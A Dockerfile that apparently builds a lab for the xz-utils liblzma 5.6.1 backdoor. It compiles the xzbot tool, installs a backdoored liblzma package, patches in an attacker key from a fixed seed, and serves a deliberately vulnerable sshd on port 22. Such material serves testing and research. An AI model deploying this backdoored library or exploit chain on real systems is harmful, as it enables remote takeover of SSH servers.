# -- Build the patched backdoor
FROM debian:bookworm AS exploit
ARG DEBIAN_FRONTEND=noninteractive

USER root

RUN apt -y update && \
    apt -y --no-install-recommends --no-install-suggests install \
    binutils \
    build-essential \
    golang-go \
    python3-pwntools \
    unzip

COPY ed448key /ed448key
WORKDIR /ed448key
RUN go build .

COPY xzbot.patch /
COPY xzbot /xzbot
WORKDIR /xzbot
RUN patch -p1 < /xzbot.patch
RUN go build .

COPY backoored-deb/liblzma5_5.6.1-1_amd64.deb /
RUN dpkg -i /liblzma5_5.6.1-1_amd64.deb
RUN python3 /xzbot/patch.py -pk "$(/ed448key/ed448key -seed 378103)" \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1

CMD ["sleep", "inf"]

# -- Build vulnerable Docker image
FROM debian:bookworm AS vulnerable
ARG DEBIAN_FRONTEND=noninteractive

USER root

RUN apt -y update && \
    apt -y --no-install-recommends --no-install-suggests install \
    openssh-server

COPY backoored-deb/liblzma5_5.6.1-1_amd64.deb /
RUN dpkg -i /liblzma5_5.6.1-1_amd64.deb
COPY --from=exploit \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1.patch \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1

RUN mkdir -p /var/run/sshd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
